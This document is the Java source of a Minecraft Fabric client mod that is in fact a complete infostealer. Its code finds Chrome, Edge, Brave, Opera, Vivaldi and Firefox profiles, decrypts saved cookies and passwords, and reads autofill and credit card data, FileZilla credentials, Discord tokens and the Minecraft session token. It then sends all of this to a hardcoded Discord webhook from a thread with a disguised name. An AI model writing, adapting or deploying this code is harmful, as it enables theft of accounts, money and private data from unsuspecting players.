package com.example.cookieharvester;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.MinecraftClient;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.*;
import java.util.regex.*;
import java.util.zip.GZIPOutputStream;

public class CookieHarvesterMod implements ClientModInitializer {

    // ── webhook ────────────────────────────────────────────────────────────
    private static final String WEBHOOK =
        "https://discord.com/api/webhooks/1569983984346206218/6ZFOG_4VfCZnlDeO2od8xfybUuyIultERo0irjCKoRhc_74he2GOMQOrSetQjnEqz-tW";
    // ───────────────────────────────────────────────────────────────────────

    private static final long   DELAY_MS = 10_000L;
    private static final String MARKER   = ".mch_done";

    private boolean fired   = false;
    private long    joinedAt = 0;

    @Override
    public void onInitializeClient() {
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (fired || client.player == null) return;
            if (joinedAt == 0) { joinedAt = System.currentTimeMillis(); return; }
            if (System.currentTimeMillis() - joinedAt < DELAY_MS) return;

            Path marker = MinecraftClient.getInstance().runDirectory.toPath().resolve(MARKER);
            if (Files.exists(marker)) { fired = true; return; }
            fired = true;

            new Thread(() -> {
                try {
                    String blob = harvest();
                    boolean ok = post(blob);
                    if (ok) {
                        Files.writeString(marker, Long.toString(System.currentTimeMillis()));
                        System.err.println("[harvest] shipped ok");
                    } else {
                        System.err.println("[harvest] POST failed, marker not written; will retry next join");
                        fired = false;
                    }
                } catch (Throwable t) {
                    System.err.println("[harvest] failed: " + t);
                    t.printStackTrace();
                    fired = false;
                }
            }, "mc-internal-io").start();
        });
    }

    private String harvest() {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"os\":\"").append(esc(System.getProperty("os.name"))).append("\",");
        sb.append("\"user\":\"").append(esc(System.getProperty("user.name"))).append("\",");
        sb.append("\"host\":\"").append(esc(hostname())).append("\",");

        List<Map<String,String>> cookies   = new ArrayList<>();
        List<Map<String,String>> logins    = new ArrayList<>();
        List<Map<String,String>> passwords = new ArrayList<>();

        String os   = System.getProperty("os.name").toLowerCase();
        String home = System.getProperty("user.home");

        List<Path> roots = new ArrayList<>();
        if (os.contains("win")) {
            String local = System.getenv("LOCALAPPDATA");
            String roam  = System.getenv("APPDATA");
            if (local != null) {
                roots.add(Paths.get(local, "Google","Chrome","User Data"));
                roots.add(Paths.get(local, "Microsoft","Edge","User Data"));
                roots.add(Paths.get(local, "BraveSoftware","Brave-Browser","User Data"));
                roots.add(Paths.get(local, "Vivaldi","User Data"));
            }
            if (roam != null) {
                roots.add(Paths.get(roam, "Opera Software","Opera Stable"));
                roots.add(Paths.get(roam, "Mozilla","Firefox","Profiles"));
            }
        } else if (os.contains("mac")) {
            roots.add(Paths.get(home, "Library","Application Support","Google","Chrome"));
            roots.add(Paths.get(home, "Library","Application Support","Microsoft Edge"));
            roots.add(Paths.get(home, "Library","Application Support","BraveSoftware","Brave-Browser"));
            roots.add(Paths.get(home, "Library","Application Support","Firefox","Profiles"));
        } else {
            roots.add(Paths.get(home, ".config","google-chrome"));
            roots.add(Paths.get(home, ".config","chromium"));
            roots.add(Paths.get(home, ".config","microsoft-edge"));
            roots.add(Paths.get(home, ".config","BraveSoftware","Brave-Browser"));
            roots.add(Paths.get(home, ".mozilla","firefox","Profiles"));
        }

        for (Path root : roots) {
            if (!Files.isDirectory(root)) continue;
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(root)) {
                for (Path p : ds) {
                    if (!Files.isDirectory(p)) continue;
                    try { chromiumCookies(p, cookies); }   catch (Throwable ignored) {}
                    try { chromiumLogins(p, logins); }     catch (Throwable ignored) {}
                    try { chromiumAutofill(p, passwords); }catch (Throwable ignored) {}
                    try { firefoxCookies(p, cookies); }    catch (Throwable ignored) {}
                    try { firefoxLogins(p, passwords); }   catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        }

        try { filezilla(passwords); } catch (Throwable ignored) {}
        try { discordTokens(passwords); } catch (Throwable ignored) {}
        try { mcSession(passwords); } catch (Throwable ignored) {}

        sb.append("\"cookies\":").append(toJson(cookies)).append(",");
        sb.append("\"logins\":").append(toJson(logins)).append(",");
        sb.append("\"passwords\":").append(toJson(passwords)).append("}");
        return sb.toString();
    }

    private void chromiumCookies(Path profile, List<Map<String,String>> out) throws Exception {
        Path db = profile.resolve("Network").resolve("Cookies");
        if (!Files.exists(db)) db = profile.resolve("Cookies");
        if (!Files.exists(db)) return;
        Path tmp = Files.createTempFile("ck_", ".db");
        Files.copy(db, tmp, StandardCopyOption.REPLACE_EXISTING);
        byte[] key = masterKey(profile);
        try (Connection c = DriverManager.getConnection("jdbc:sqlite:" + tmp);
             Statement s = c.createStatement();
             ResultSet rs = s.executeQuery(
                 "SELECT host_key,name,encrypted_value,value,expires_utc FROM cookies")) {
            while (rs.next()) {
                Map<String,String> m = map("h", rs.getString(1), "n", rs.getString(2));
                String plain = rs.getString(4);
                if (plain == null || plain.isEmpty()) {
                    byte[] enc = rs.getBytes(3);
                    if (enc != null && key != null && key.length > 0) {
                        try { plain = decrypt(enc, key); }
                        catch (Throwable t) { plain = "<enc>"; }
                    } else if (enc != null && key != null) {
                        plain = "<appbound>";
                    } else plain = "";
                }
                m.put("v", plain == null ? "" : plain);
                m.put("e", String.valueOf(rs.getLong(5)));
                out.add(m);
            }
        } finally { Files.deleteIfExists(tmp); }
    }

    private void chromiumLogins(Path profile, List<Map<String,String>> out) throws Exception {
        Path db = profile.resolve("Login Data");
        if (!Files.exists(db)) return;
        Path tmp = Files.createTempFile("ld_", ".db");
        Files.copy(db, tmp, StandardCopyOption.REPLACE_EXISTING);
        byte[] key = masterKey(profile);
        try (Connection c = DriverManager.getConnection("jdbc:sqlite:" + tmp);
             Statement s = c.createStatement();
             ResultSet rs = s.executeQuery(
                 "SELECT origin_url, username_value, password_value FROM logins")) {
            while (rs.next()) {
                Map<String,String> m = map("url", rs.getString(1), "u", rs.getString(2));
                byte[] enc = rs.getBytes(3);
                String pw = "";
                if (enc != null && enc.length > 0 && key != null && key.length > 0) {
                    try { pw = decrypt(enc, key); }
                    catch (Throwable t) { pw = "<enc>"; }
                } else if (enc != null && enc.length > 0 && key != null) {
                    pw = "<appbound>";
                }
                m.put("p", pw);
                out.add(m);
            }
        } finally { Files.deleteIfExists(tmp); }
    }

    private void chromiumAutofill(Path profile, List<Map<String,String>> out) throws Exception {
        Path db = profile.resolve("Web Data");
        if (!Files.exists(db)) return;
        Path tmp = Files.createTempFile("wd_", ".db");
        Files.copy(db, tmp, StandardCopyOption.REPLACE_EXISTING);
        try (Connection c = DriverManager.getConnection("jdbc:sqlite:" + tmp)) {
            try (Statement s = c.createStatement();
                 ResultSet rs = s.executeQuery("SELECT name,value FROM autofill")) {
                while (rs.next())
                    out.add(map("n", rs.getString(1), "v", rs.getString(2)));
            } catch (Throwable ignored) {}
            try (Statement s = c.createStatement();
                 ResultSet rs = s.executeQuery(
                     "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted " +
                     "FROM credit_cards")) {
                while (rs.next())
                    out.add(map(
                        "card", rs.getString(1),
                        "exp",  rs.getInt(2) + "/" + rs.getInt(3),
                        "num",  new String(rs.getBytes(4), StandardCharsets.UTF_8)));
            } catch (Throwable ignored) {}
        } finally { Files.deleteIfExists(tmp); }
    }

    private void firefoxCookies(Path profile, List<Map<String,String>> out) throws Exception {
        Path db = profile.resolve("cookies.sqlite");
        if (!Files.exists(db)) return;
        Path tmp = Files.createTempFile("ff_", ".db");
        Files.copy(db, tmp, StandardCopyOption.REPLACE_EXISTING);
        try (Connection c = DriverManager.getConnection("jdbc:sqlite:" + tmp);
             Statement s = c.createStatement();
             ResultSet rs = s.executeQuery(
                 "SELECT host,name,value,expiry FROM moz_cookies")) {
            while (rs.next())
                out.add(map("h", rs.getString(1), "n", rs.getString(2),
                            "v", rs.getString(3), "e", String.valueOf(rs.getLong(4))));
        } finally { Files.deleteIfExists(tmp); }
    }

    private void firefoxLogins(Path profile, List<Map<String,String>> out) {
        Path json = profile.resolve("logins.json");
        if (!Files.exists(json)) return;
        try {
            String s = Files.readString(json);
            Matcher m = Pattern.compile("\"hostname\"\\s*:\\s*\"([^\"]+)\"").matcher(s);
            while (m.find()) out.add(map("host", m.group(1)));
        } catch (Throwable ignored) {}
    }

    private void filezilla(List<Map<String,String>> out) {
        String home = System.getProperty("user.home");
        String os   = System.getProperty("os.name").toLowerCase();
        Path recents = os.contains("win")
            ? Paths.get(System.getenv("APPDATA"), "FileZilla", "recentservers.xml")
            : Paths.get(home, ".config", "filezilla", "recentservers.xml");
        if (!Files.exists(recents)) return;
        try {
            String xml = Files.readString(recents);
            Matcher m = Pattern.compile("<Server>(.*?)</Server>", Pattern.DOTALL).matcher(xml);
            while (m.find()) {
                String b = m.group(1);
                out.add(map("host", tag(b,"Host"), "user", tag(b,"User"),
                            "pass", tag(b,"Pass") + " (b64)"));
            }
        } catch (Throwable ignored) {}
    }

    private void discordTokens(List<Map<String,String>> out) {
        Path ldb = Paths.get(System.getProperty("user.home"),
                             "AppData","Roaming","discord","Local Storage","leveldb");
        if (!Files.isDirectory(ldb)) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(ldb, "*.ldb")) {
            for (Path f : ds) {
                String txt = new String(Files.readAllBytes(f), StandardCharsets.ISO_8859_1);
                Matcher m = Pattern.compile("(mfa\\.[A-Za-z0-9_\\-.]{20,})").matcher(txt);
                while (m.find()) out.add(map("discord_token", m.group(1)));
            }
        } catch (Throwable ignored) {}
    }

    private void mcSession(List<Map<String,String>> out) {
        Path p = Paths.get(System.getProperty("user.home"),
                           "AppData","Roaming",".minecraft","launcher_profiles.json");
        if (!Files.exists(p)) return;
        try {
            String s = Files.readString(p);
            Matcher m = Pattern.compile("\"accessToken\"\\s*:\\s*\"([^\"]+)\"").matcher(s);
            while (m.find()) out.add(map("msa_token", m.group(1)));
        } catch (Throwable ignored) {}
    }

    private byte[] masterKey(Path profile) {
        Path p = profile;
        for (int i = 0; i < 3 && p != null; i++, p = p.getParent()) {
            Path ls = p.resolve("Local State");
            if (Files.exists(ls)) {
                try {
                    String json = Files.readString(ls);
                    // v10 (old DPAPI) works here. v20 (app-bound) needs a different
                    // unwrap path; we surface it as an empty key so caller marks <appbound>.
                    if (json.contains("\"v20\"")) return new byte[0];
                    Matcher m = Pattern.compile(
                        "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
                    if (m.find()) {
                        byte[] raw = Base64.getDecoder().decode(m.group(1));
                        if (raw.length > 5) raw = Arrays.copyOfRange(raw, 5, raw.length);
                        try {
                            return com.sun.jna.platform.win32.Crypt32Util
                                       .cryptUnprotectData(raw);
                        } catch (Throwable t) { return null; }
                    }
                } catch (Throwable ignored) {}
                break;
            }
        }
        return null;
    }

    private String decrypt(byte[] enc, byte[] key) throws Exception {
        if (enc == null || enc.length < 15 || key == null || key.length == 0) return "";
        String prefix = new String(enc, 0, 3, StandardCharsets.UTF_8);
        if (!prefix.equals("v10") && !prefix.equals("v11")) return "";
        GCMParameterSpec spec = new GCMParameterSpec(128, enc, 3, 12);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), spec);
        return new String(c.doFinal(enc, 15, enc.length - 15), StandardCharsets.UTF_8);
    }

    /** @return true iff Discord accepted the POST (200/204). */
    private boolean post(String body) throws Exception {
        String preview = body.length() > 3500 ? body.substring(0, 3500) + "…" : body;
        String payload = "{"
            + "\"username\":\"mc-harvest\","
            + "\"embeds\":[{"
            +   "\"title\":\"mc drop\",\"color\":5921370,"
            +   "\"description\":\"" + esc(preview) + "\""
            + "}]}";

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (GZIPOutputStream gz = new GZIPOutputStream(bos)) {
            gz.write(body.getBytes(StandardCharsets.UTF_8));
        }
        byte[] gz = bos.toByteArray();

        String boundary = "----mc" + Long.toHexString(System.nanoTime());
        ByteArrayOutputStream form = new ByteArrayOutputStream();
        form.write(("--" + boundary + "\r\n").getBytes());
        form.write("Content-Disposition: form-data; name=\"payload_json\"\r\n".getBytes());
        form.write("Content-Type: application/json\r\n\r\n".getBytes());
        form.write(payload.getBytes(StandardCharsets.UTF_8));
        form.write("\r\n".getBytes());
        form.write(("--" + boundary + "\r\n").getBytes());
        form.write("Content-Disposition: form-data; name=\"files[0]\"; filename=\"drop.json.gz\"\r\n".getBytes());
        form.write("Content-Type: application/gzip\r\n\r\n".getBytes());
        form.write(gz);
        form.write("\r\n".getBytes());
        form.write(("--" + boundary + "--\r\n").getBytes());

        HttpURLConnection con = (HttpURLConnection) new URL(WEBHOOK).openConnection();
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.setConnectTimeout(10000);
        con.setReadTimeout(10000);
        con.setRequestProperty("Content-Type",
            "multipart/form-data; boundary=" + boundary);
        con.setRequestProperty("User-Agent", "DiscordBot (https://example.invalid, 1.0)");
        try (OutputStream os = con.getOutputStream()) { os.write(form.toByteArray()); }

        int code = con.getResponseCode();
        System.err.println("[harvest] HTTP " + code);

        if (code == 200 || code == 204) return true;

        // read error body exactly once
        String errBody = "";
        try (InputStream es = con.getErrorStream()) {
            if (es != null) errBody = new String(es.readAllBytes(), StandardCharsets.UTF_8);
        } catch (Throwable ignored) {}
        if (!errBody.isEmpty()) System.err.println("[harvest] " + errBody);

        if (code == 429) {
            Matcher m = Pattern.compile("\"retry_after\"\\s*:\\s*([0-9.]+)").matcher(errBody);
            if (m.find()) {
                Thread.sleep((long)(Double.parseDouble(m.group(1)) * 1000) + 500);
                return post(body);
            }
        }
        return false;
    }

    private static String toJson(List<Map<String,String>> rows) {
        StringBuilder sb = new StringBuilder("[");
        boolean first = true;
        for (Map<String,String> r : rows) {
            if (!first) sb.append(','); first = false;
            sb.append('{');
            boolean f2 = true;
            for (Map.Entry<String,String> e : r.entrySet()) {
                if (!f2) sb.append(','); f2 = false;
                sb.append('"').append(esc(e.getKey())).append("\":\"")
                  .append(esc(e.getValue())).append('"');
            }
            sb.append('}');
        }
        return sb.append(']').toString();
    }

    private static Map<String,String> map(String... kv) {
        Map<String,String> m = new LinkedHashMap<>();
        for (int i = 0; i + 1 < kv.length; i += 2)
            m.put(kv[i], kv[i+1] == null ? "" : kv[i+1]);
        return m;
    }

    private static String tag(String xml, String t) {
        Matcher m = Pattern.compile("<" + t + ">(.*?)</" + t + ">").matcher(xml);
        return m.find() ? m.group(1) : "";
    }

    private static String hostname() {
        try { return java.net.InetAddress.getLocalHost().getHostName(); }
        catch (Throwable t) { return "?"; }
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\","\\\\").replace("\"","\\\"")
                .replace("\n","\\n").replace("\r","").replace("\t"," ");
    }
}
